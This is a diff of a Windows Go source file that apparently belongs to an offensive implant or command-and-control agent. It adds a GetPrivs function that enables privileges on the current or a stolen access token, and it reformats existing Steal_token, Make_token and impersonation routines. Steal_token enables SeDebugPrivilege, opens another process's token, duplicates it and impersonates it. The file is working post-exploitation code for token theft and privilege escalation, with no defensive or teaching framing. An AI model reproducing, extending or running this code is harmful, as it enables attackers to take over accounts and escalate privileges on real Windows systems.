@@ -1,4 +1,5 @@
 //go:build windows
+
 package packet
 
 import (
@@ -27,7 +28,7 @@ type TokenPrivileges struct {
 }
 
 var (
-	advapi32DLL = syscall.NewLazyDLL("Advapi32.dll")
+	advapi32DLL             = syscall.NewLazyDLL("Advapi32.dll")
 	LookupPrivilegeValueW   = advapi32DLL.NewProc("LookupPrivilegeValueW")   // https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-lookupprivilegevaluew
 	AdjustTokenPrivileges   = advapi32DLL.NewProc("AdjustTokenPrivileges")   // https://docs.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-adjusttokenprivileges
 	ImpersonateLoggedOnUser = advapi32DLL.NewProc("ImpersonateLoggedOnUser") // https://docs.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-impersonatefmtgedonuser
@@ -36,8 +37,8 @@ var (
 	CreateProcessWithLogonW = advapi32DLL.NewProc("CreateProcessWithLogonW")
 	LogonUserA              = advapi32DLL.NewProc("LogonUserA")
 	LogonUserW              = advapi32DLL.NewProc("LogonUserW")
-	LogonUserExW              = advapi32DLL.NewProc("LogonUserExW")
-	)
+	LogonUserExW            = advapi32DLL.NewProc("LogonUserExW")
+)
 
 const (
 	// [Access Rights for Access-Token Objects](https://docs.microsoft.com/en-us/windows/win32/secauthz/access-rights-for-access-token-objects)
@@ -169,7 +170,6 @@ func Steal_token(pid uint32){
 
 func runAsToken(TokenHandle uintptr) (*syscall.Token, error) {
 
-
 	var NewTokenHandle syscall.Token
 
 	/*_, _, err := ImpersonateLoggedOnUser.Call(TokenHandle)
@@ -188,7 +188,7 @@ func runAsToken(TokenHandle uintptr) (*syscall.Token, error) {
 	}
 
 	_, _, err = ImpersonateLoggedOnUser.Call(uintptr(NewTokenHandle))
-	if err != nil && err.Error() != ("The operation completed successfully."){
+	if err != nil && err.Error() != ("The operation completed successfully.") {
 		fmt.Println("[-] ImpersonateLoggedOnUser() error:", err)
 		return nil, errors.New("[-] ImpersonateLoggedOnUser() error: " + err.Error())
 	} else {
@@ -203,12 +203,49 @@ func runAsToken(TokenHandle uintptr) (*syscall.Token, error) {
 	fmt.Printf("out: %s\n",out)
 	fmt.Println(out)*/
 
-
 	return &NewTokenHandle, nil
 }
 
+func GetPrivs(privs []string, stolenToken uintptr) ([]byte, error) {
+	result := ""
+	var token uintptr
+	// if stolenToken doesn't exist, use current process token
+	if stolenToken == 0 {
+		p := windows.CurrentProcess()
+		err := windows.OpenProcessToken(p, windows.TOKEN_ADJUST_PRIVILEGES|windows.TOKEN_QUERY, (*windows.Token)(&token))
+		if err != nil {
+			return []byte(result), errors.New(fmt.Sprintf("OpenProcessToken error: %s", err))
+		}
+	} else { // else use stolenToken
+		token = stolenToken
+	}
+	LUIDs := make([]windows.LUID, len(privs))
+	for i, priv := range privs {
+		_ = windows.LookupPrivilegeValue(nil, windows.StringToUTF16Ptr(priv), &LUIDs[i])
+	}
 
-func Steal_token(pid uint32) (uintptr, []byte, error){
+	for i, LUID := range LUIDs {
+		var tokenPrivileges windows.Tokenprivileges
+		tokenPrivileges.PrivilegeCount = 1
+		tokenPrivileges.Privileges[0] = windows.LUIDAndAttributes{
+			Luid:       LUID,
+			Attributes: windows.SE_PRIVILEGE_ENABLED,
+		}
+		_, _, err := AdjustTokenPrivileges.Call(token, 0, uintptr(unsafe.Pointer(&tokenPrivileges)), 0, 0, 0)
+		if err != nil {
+			if err == windows.ERROR_NOT_ALL_ASSIGNED {
+				continue
+			} else if err == windows.SEVERITY_SUCCESS {
+				result += fmt.Sprintf("%s\n", privs[i])
+			} else {
+				return []byte(result), errors.New(fmt.Sprintf("AdjustTokenPrivileges error: %s", err))
+			}
+		}
+	}
+	return []byte(result), nil
+}
+
+func Steal_token(pid uint32) (uintptr, []byte, error) {
 	var TokenHandle syscall.Token
 	err := enableSeDebugPrivilege()
 	if err != nil && err.Error() != ("The operation completed successfully.") {
@@ -221,7 +258,7 @@ func Steal_token(pid uint32) (uintptr, []byte, error){
 		return 0, nil, err
 	}
 	err = syscall.OpenProcessToken(ProcessHandle, TOKEN_QUERY|TOKEN_DUPLICATE, &TokenHandle)
-	if err != nil && err.Error() != ("The operation completed successfully."){
+	if err != nil && err.Error() != ("The operation completed successfully.") {
 		fmt.Println("[-] OpenProcessToken_main() error:", err)
 		return 0, nil, errors.New("[-] OpenProcessToken_main() error: " + err.Error())
 	} else {
@@ -230,15 +267,15 @@ func Steal_token(pid uint32) (uintptr, []byte, error){
 
 	//var TokenHandleTemp *syscall.Token
 	TokenHandleTemp, err := runAsToken(uintptr(TokenHandle))
-	if err != nil && err.Error() != ("The operation completed successfully."){
+	if err != nil && err.Error() != ("The operation completed successfully.") {
 		return 0, nil, err
-	}else{
+	} else {
 		return uintptr(*TokenHandleTemp), []byte("Steal token success"), nil
 	}
 
 }
 
-func Run2self() (bool, error){
+func Run2self() (bool, error) {
 	err := windows.RevertToSelf()
 	if err != nil {
 		return false, err
@@ -289,48 +326,47 @@ func Make_token(b []byte) (uintptr, error) {
 	TokenTemp, err := runAsToken(uintptr(Token))
 	if err != nil {
 		return 0, err
-	}else{
+	} else {
 		return uintptr(*TokenTemp), nil
 	}
 }
 
-	/*var (
-		sI windows.StartupInfo
-		pI windows.ProcessInformation
-	)
+/*var (
+	sI windows.StartupInfo
+	pI windows.ProcessInformation
+)
 
-	program, _ := windows.UTF16PtrFromString("main.exe")
+program, _ := windows.UTF16PtrFromString("main.exe")
 
-	result, _, err := DuplicateTokenEx.Call(uintptr(Token), MAXIMUM_ALLOWED, uintptr(0), SecurityImpersonation, TokenPrimary, uintptr(unsafe.Pointer(&Token)))
-	if result != 1 {
-		fmt.Println("[-] DuplicateTokenEx() error:", err)
-	} else {
-		fmt.Println("[+] DuplicateTokenEx() success")
-	}
+result, _, err := DuplicateTokenEx.Call(uintptr(Token), MAXIMUM_ALLOWED, uintptr(0), SecurityImpersonation, TokenPrimary, uintptr(unsafe.Pointer(&Token)))
+if result != 1 {
+	fmt.Println("[-] DuplicateTokenEx() error:", err)
+} else {
+	fmt.Println("[+] DuplicateTokenEx() success")
+}
 
-	var NewToken syscall.Token
-	result, _, err = CreateProcessWithTokenW.Call(
-		uintptr(NewToken),
-		LOGON_WITH_PROFILE,
-		uintptr(0),
-		uintptr(unsafe.Pointer(program)),
-		0,
-		uintptr(0),
-		uintptr(0),
-		uintptr(unsafe.Pointer(&sI)),
-		uintptr(unsafe.Pointer(&pI)))
+var NewToken syscall.Token
+result, _, err = CreateProcessWithTokenW.Call(
+	uintptr(NewToken),
+	LOGON_WITH_PROFILE,
+	uintptr(0),
+	uintptr(unsafe.Pointer(program)),
+	0,
+	uintptr(0),
+	uintptr(0),
+	uintptr(unsafe.Pointer(&sI)),
+	uintptr(unsafe.Pointer(&pI)))
 
-	if result != 1 {
-		fmt.Println("[-] CreateProcessWithTokenW() error:", err)
-		return &Token
-	} else {
-		fmt.Println("[+] CreateProcessWithTokenW() success")
-	}
-	if err != nil && err.Error() != ("The operation completed successfully.") {
-		return &Token
-		fmt.Println(err)
-	}*/
-
+if result != 1 {
+	fmt.Println("[-] CreateProcessWithTokenW() error:", err)
+	return &Token
+} else {
+	fmt.Println("[+] CreateProcessWithTokenW() success")
+}
+if err != nil && err.Error() != ("The operation completed successfully.") {
+	return &Token
+	fmt.Println(err)
+}*/
 
 /*func GetCurrentProcessToken() syscall.Token{
 	var TokenHandle syscall.Token
@@ -370,4 +406,3 @@ func Make_token(b []byte) (uintptr, error) {
 
 	return NewTokenHandle
 }*/
-
